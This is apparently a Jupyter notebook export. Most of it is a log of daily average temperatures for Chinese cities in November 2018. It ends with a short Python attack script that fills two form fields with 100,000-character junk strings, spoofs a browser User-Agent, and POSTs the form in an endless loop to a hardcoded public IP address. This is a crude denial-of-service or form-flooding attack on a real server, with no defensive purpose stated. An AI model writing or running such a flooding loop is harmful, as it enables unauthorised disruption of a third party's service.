# {'name': '柳州', 'prov': '广西', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': 15.125, 'date': '2018-11-15'}
# Successful
# {'name': '南宁', 'prov': '广西', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': 22.325000000000003, 'date': '2018-11-11'}
# Nothing to do
# {'name': '南宁', 'prov': '广西', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': 19.875, 'date': '2018-11-12'}
# Nothing to do
# {'name': '南宁', 'prov': '广西', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': 20.975, 'date': '2018-11-13'}
# Nothing to do
# {'name': '南宁', 'prov': '广西', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': 21.75, 'date': '2018-11-14'}
# Successful
# {'name': '南宁', 'prov': '广西', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': 22.35, 'date': '2018-11-15'}
# Successful
# {'name': '北海', 'prov': '广西', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': 25.674999999999997, 'date': '2018-11-11'}
# Successful
# {'name': '北海', 'prov': '广西', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': 24.599999999999998, 'date': '2018-11-12'}
# Successful
# {'name': '北海', 'prov': '广西', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': 25.0, 'date': '2018-11-13'}
# Successful
# {'name': '北海', 'prov': '广西', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': 25.55, 'date': '2018-11-14'}
# Successful
# {'name': '北海', 'prov': '广西', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': 25.2, 'date': '2018-11-15'}
# Successful
# {'name': '海口', 'prov': '海南', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': 25.85, 'date': '2018-11-11'}
# Nothing to do
# {'name': '海口', 'prov': '海南', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': 25.299999999999997, 'date': '2018-11-12'}
# Nothing to do
# {'name': '海口', 'prov': '海南', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': 25.525000000000002, 'date': '2018-11-13'}
# Nothing to do
# {'name': '海口', 'prov': '海南', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': 25.475, 'date': '2018-11-14'}
# Successful
# {'name': '海口', 'prov': '海南', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': 25.525, 'date': '2018-11-15'}
# Successful
# {'name': '万宁', 'prov': '海南', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': 25.575000000000003, 'date': '2018-11-11'}
# Successful
# {'name': '万宁', 'prov': '海南', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': 25.424999999999997, 'date': '2018-11-12'}
# Successful
# {'name': '万宁', 'prov': '海南', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': 25.675000000000004, 'date': '2018-11-13'}
# Successful
# {'name': '万宁', 'prov': '海南', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': 25.724999999999998, 'date': '2018-11-14'}
# Successful
# {'name': '万宁', 'prov': '海南', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': 25.05, 'date': '2018-11-15'}
# Successful
# {'name': '渝北', 'prov': '重庆', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': 11.875, 'date': '2018-11-11'}
# Successful
# {'name': '渝北', 'prov': '重庆', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': 13.149999999999999, 'date': '2018-11-12'}
# Successful
# {'name': '渝北', 'prov': '重庆', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': 12.95, 'date': '2018-11-13'}
# Successful
# {'name': '渝北', 'prov': '重庆', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': 13.125, 'date': '2018-11-14'}
# Successful
# {'name': '渝北', 'prov': '重庆', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': 13.175, 'date': '2018-11-15'}
# Successful
# {'name': '沙坪坝', 'prov': '重庆', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': 14.075, 'date': '2018-11-11'}
# Nothing to do
# {'name': '沙坪坝', 'prov': '重庆', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': 14.35, 'date': '2018-11-12'}
# Nothing to do
# {'name': '沙坪坝', 'prov': '重庆', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': 14.65, 'date': '2018-11-13'}
# Nothing to do
# {'name': '沙坪坝', 'prov': '重庆', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': 14.700000000000001, 'date': '2018-11-14'}
# Successful
# {'name': '沙坪坝', 'prov': '重庆', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': 14.95, 'date': '2018-11-15'}
# Successful
# {'name': '温江', 'prov': '四川', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': 13.2, 'date': '2018-11-11'}
# Nothing to do
# {'name': '温江', 'prov': '四川', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': 13.475, 'date': '2018-11-12'}
# Nothing to do
# {'name': '温江', 'prov': '四川', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': 12.225000000000001, 'date': '2018-11-13'}
# Nothing to do
# {'name': '温江', 'prov': '四川', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': 12.4, 'date': '2018-11-14'}
# Successful
# {'name': '温江', 'prov': '四川', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': 10.825, 'date': '2018-11-15'}
# Successful
# {'name': '宜宾', 'prov': '四川', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': 14.8, 'date': '2018-11-11'}
# Successful
# {'name': '宜宾', 'prov': '四川', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': 14.8, 'date': '2018-11-12'}
# Successful
# {'name': '宜宾', 'prov': '四川', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': 12.975, 'date': '2018-11-13'}
# Successful
# {'name': '宜宾', 'prov': '四川', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': 13.075000000000001, 'date': '2018-11-14'}
# Successful
# {'name': '宜宾', 'prov': '四川', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': 12.600000000000001, 'date': '2018-11-15'}
# Successful
# {'name': '攀枝花', 'prov': '四川', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': 17.5, 'date': '2018-11-11'}
# Successful
# {'name': '攀枝花', 'prov': '四川', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': 16.725, 'date': '2018-11-12'}
# Successful
# {'name': '攀枝花', 'prov': '四川', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': 17.525, 'date': '2018-11-13'}
# Successful
# {'name': '攀枝花', 'prov': '四川', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': 17.5, 'date': '2018-11-14'}
# Successful
# {'name': '攀枝花', 'prov': '四川', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': 17.725, 'date': '2018-11-15'}
# Successful
# {'name': '贵阳', 'prov': '贵州', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': 10.35, 'date': '2018-11-11'}
# Nothing to do
# {'name': '贵阳', 'prov': '贵州', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': 9.6, 'date': '2018-11-12'}
# Nothing to do
# {'name': '贵阳', 'prov': '贵州', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': 9.275, 'date': '2018-11-13'}
# Nothing to do
# {'name': '贵阳', 'prov': '贵州', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': 9.450000000000001, 'date': '2018-11-14'}
# Successful
# {'name': '贵阳', 'prov': '贵州', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': 9.55, 'date': '2018-11-15'}
# Successful
# {'name': '昆明', 'prov': '云南', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': 14.500000000000002, 'date': '2018-11-11'}
# Nothing to do
# {'name': '昆明', 'prov': '云南', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': 14.05, 'date': '2018-11-12'}
# Nothing to do
# {'name': '昆明', 'prov': '云南', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': 12.975, 'date': '2018-11-13'}
# Nothing to do
# {'name': '昆明', 'prov': '云南', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': 14.475, 'date': '2018-11-14'}
# Successful
# {'name': '昆明', 'prov': '云南', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': 14.675, 'date': '2018-11-15'}
# Successful
# {'name': '元江', 'prov': '云南', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': 24.625, 'date': '2018-11-11'}
# Successful
# {'name': '元江', 'prov': '云南', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': 23.099999999999998, 'date': '2018-11-12'}
# Successful
# {'name': '元江', 'prov': '云南', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': 23.425000000000004, 'date': '2018-11-13'}
# Successful
# {'name': '元江', 'prov': '云南', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': 22.1, 'date': '2018-11-14'}
# Successful
# {'name': '元江', 'prov': '云南', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': 22.924999999999997, 'date': '2018-11-15'}
# Successful
# {'name': '勐腊', 'prov': '云南', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': 22.0, 'date': '2018-11-11'}
# Nothing to do
# {'name': '勐腊', 'prov': '云南', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': 21.8, 'date': '2018-11-12'}
# Nothing to do
# {'name': '勐腊', 'prov': '云南', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': 21.9, 'date': '2018-11-13'}
# Nothing to do
# {'name': '勐腊', 'prov': '云南', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': 22.549999999999997, 'date': '2018-11-14'}
# Successful
# {'name': '勐腊', 'prov': '云南', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': 22.375, 'date': '2018-11-15'}
# Successful
# {'name': '宝鸡', 'prov': '陕西', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': 7.075, 'date': '2018-11-11'}
# Successful
# {'name': '宝鸡', 'prov': '陕西', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': 6.125, 'date': '2018-11-12'}
# Successful
# {'name': '宝鸡', 'prov': '陕西', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': 7.550000000000001, 'date': '2018-11-13'}
# Successful
# {'name': '宝鸡', 'prov': '陕西', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': 8.575, 'date': '2018-11-14'}
# Successful
# {'name': '宝鸡', 'prov': '陕西', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': 5.9, 'date': '2018-11-15'}
# Successful
# {'name': '汉中', 'prov': '陕西', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': 9.9, 'date': '2018-11-11'}
# Nothing to do
# {'name': '汉中', 'prov': '陕西', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': 10.425, 'date': '2018-11-12'}
# Nothing to do
# {'name': '汉中', 'prov': '陕西', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': 10.425, 'date': '2018-11-13'}
# Nothing to do
# {'name': '汉中', 'prov': '陕西', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': 11.125, 'date': '2018-11-14'}
# Successful
# {'name': '汉中', 'prov': '陕西', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': 8.925, 'date': '2018-11-15'}
# Successful
# {'name': '旬阳', 'prov': '陕西', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': 11.774999999999999, 'date': '2018-11-11'}
# Successful
# {'name': '旬阳', 'prov': '陕西', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': 10.975, 'date': '2018-11-12'}
# Successful
# {'name': '旬阳', 'prov': '陕西', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': 11.499999999999998, 'date': '2018-11-13'}
# Successful
# {'name': '旬阳', 'prov': '陕西', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': 12.575, 'date': '2018-11-14'}
# Successful
# {'name': '旬阳', 'prov': '陕西', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': 12.149999999999999, 'date': '2018-11-15'}
# Successful
# {'name': '安康', 'prov': '陕西', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': 12.275, 'date': '2018-11-11'}
# Successful
# {'name': '安康', 'prov': '陕西', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': 10.675, 'date': '2018-11-12'}
# Successful
# {'name': '安康', 'prov': '陕西', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': 11.65, 'date': '2018-11-13'}
# Successful
# {'name': '安康', 'prov': '陕西', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': 12.475, 'date': '2018-11-14'}
# Successful
# {'name': '安康', 'prov': '陕西', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': 11.875, 'date': '2018-11-15'}
# Successful
# {'name': '西青', 'prov': '天津', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': 9.0, 'date': '2018-11-11'}
# Nothing to do
# {'name': '西青', 'prov': '天津', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': 9.05, 'date': '2018-11-12'}
# Nothing to do
# {'name': '西青', 'prov': '天津', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': 9.024999999999999, 'date': '2018-11-13'}
# Nothing to do
# {'name': '西青', 'prov': '天津', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': 7.175, 'date': '2018-11-14'}
# Successful
# {'name': '西青', 'prov': '天津', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': 6.475, 'date': '2018-11-15'}
# Successful

# %%
import requests
question = ""
opinion = ""
url = 'http://18.212.159.250/'
for _ in range(100000):
    question += '$'
    opinion += '$'
    
form = {
    'question': question,
    'opinion': opinion,
}

headers = {
    'User-Agent':'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6'
}

# %%
while True:
    result = requests.post(url = url, headers = headers, data = form)
# Out:
# ---------------------------------------------------------------------------
# NameError                                 Traceback (most recent call last)
# <ipython-input-17-ff1512e202c4> in <module>
# ----> 1 while true:
#       2     result = requests.post(url = url, headers = headers, data = form)
#
# NameError: name 'true' is not defined
